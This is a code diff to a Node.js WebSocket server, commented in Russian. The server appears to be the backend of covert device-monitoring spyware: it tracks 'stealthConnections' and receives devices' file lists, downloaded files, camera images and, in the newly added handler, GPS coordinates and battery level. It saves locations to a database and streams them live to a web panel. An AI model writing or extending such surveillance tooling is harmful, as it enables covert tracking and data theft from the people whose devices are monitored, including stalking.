@@ -137,68 +137,124 @@ wss.on("connection", (ws, req) => {
     }, 30000);
 
     ws.on("message", (rawData) => {
-      try {
+    try {
         const msg = JSON.parse(rawData.toString());
         const deviceInfo = stealthConnections.get(deviceId);
         if (deviceInfo) deviceInfo.lastSeen = Date.now();
 
-        // Логический пинг-понг на уровне JSON сообщений
+        // ✅ Обработка ping
         if (msg.type === "ping") {
-          console.log(`💓 Ping from ${deviceId}`);
-          // ✅ ИСПРАВЛЕНО: Просто отвечаем pong, НЕ закрываем соединение
-          try {
-            if (isWsOpen(ws)) {
-              ws.send(JSON.stringify({ type: "pong", timestamp: Date.now() }));
+            console.log(`💓 Ping from ${deviceId}`);
+            try {
+                if (isWsOpen(ws)) {
+                    ws.send(JSON.stringify({ type: "pong", timestamp: Date.now() }));
+                }
+            } catch (e) {
+                console.error("Error sending pong:", e);
             }
-          } catch (e) {
-            console.error("Error sending pong:", e);
-          }
-          return;
+            return;
         }
 
+        // ✅✅✅ НОВАЯ ОБРАБОТКА: type === "location"
+        if (msg.type === "location") {
+            console.log(`📍 Location from ${deviceId}: ${msg.latitude}, ${msg.longitude}`);
+            
+            // Сохраняем в базу данных
+            (async () => {
+                try {
+                    const { error } = await supabase.from("locations").insert([{
+                        device_id: msg.device_id || deviceId,
+                        device_name: msg.device_name || "Unknown Device",
+                        latitude: parseFloat(msg.latitude),
+                        longitude: parseFloat(msg.longitude),
+                        timestamp: msg.timestamp || Date.now(),
+                        accuracy: msg.accuracy ? parseFloat(msg.accuracy) : null,
+                        battery: msg.battery != null ? parseInt(msg.battery) : null,
+                        wifi_info: null
+                    }]);
+                    
+                    if (error) {
+                        console.error("❌ Error saving location:", error);
+                    } else {
+                        console.log(`   ✅ Location saved to database`);
+                    }
+                } catch (err) {
+                    console.error("❌ Database error:", err);
+                }
+            })();
+            
+            // Отправляем подтверждение устройству
+            try {
+                if (isWsOpen(ws)) {
+                    ws.send(JSON.stringify({
+                        type: 'location_ack',
+                        timestamp: Date.now()
+                    }));
+                }
+            } catch (e) {
+                console.error("Error sending location ack:", e);
+            }
+            
+            // Broadcast веб-клиентам
+            broadcastToWebClients({
+                type: "location",
+                deviceId: deviceId,
+                data: {
+                    latitude: parseFloat(msg.latitude),
+                    longitude: parseFloat(msg.longitude),
+                    accuracy: msg.accuracy,
+                    battery: msg.battery
+                },
+                timestamp: msg.timestamp || Date.now()
+            });
+            
+            return;
+        }
+
+        // ✅ Остальные обработчики (file_list, file_download, image)
         if (msg.type === "file_list") {
-          deviceFileCache.set(deviceId, {
-            data: msg.data,
-            timestamp: Date.now()
-          });
-          const totalFiles = (msg.data && msg.data.total) || 0;
-          console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
-          return;
+            deviceFileCache.set(deviceId, {
+                data: msg.data,
+                timestamp: Date.now()
+            });
+            const totalFiles = (msg.data && msg.data.total) || 0;
+            console.log(`📁 Received file list from ${deviceId}: ${totalFiles} files`);
+            return;
         }
 
         if (msg.type === "file_download") {
-          console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
-          broadcastToWebClients({
-            type: "file_download",
-            deviceId,
-            filename: msg.filename,
-            data: msg.data,
-            size: msg.size,
-            timestamp: msg.timestamp || Date.now()
-          });
-          return;
+            console.log(`📥 Received file: ${msg.filename} from ${deviceId}`);
+            broadcastToWebClients({
+                type: "file_download",
+                deviceId,
+                filename: msg.filename,
+                data: msg.data,
+                size: msg.size,
+                timestamp: msg.timestamp || Date.now()
+            });
+            return;
         }
 
         if (msg.type === "image") {
-          const info = stealthConnections.get(deviceId);
-          if (info) {
-            info.latestImage = msg.data;
-            info.latestImageTime = Date.now();
-          }
+            const info = stealthConnections.get(deviceId);
+            if (info) {
+                info.latestImage = msg.data;
+                info.latestImageTime = Date.now();
+            }
         }
 
         // Broadcast others to web UI
         broadcastToWebClients({
-          type: msg.type,
-          deviceId,
-          data: msg.data,
-          timestamp: msg.timestamp || Date.now()
+            type: msg.type,
+            deviceId,
+            data: msg.data,
+            timestamp: msg.timestamp || Date.now()
         });
 
-      } catch (err) {
+    } catch (err) {
         console.error(`Error from device ${deviceId}:`, err);
-      }
-    });
+    }
+});
 
     ws.on("close", () => {
       clearInterval(keepaliveLogger);
@@ -607,3 +663,4 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
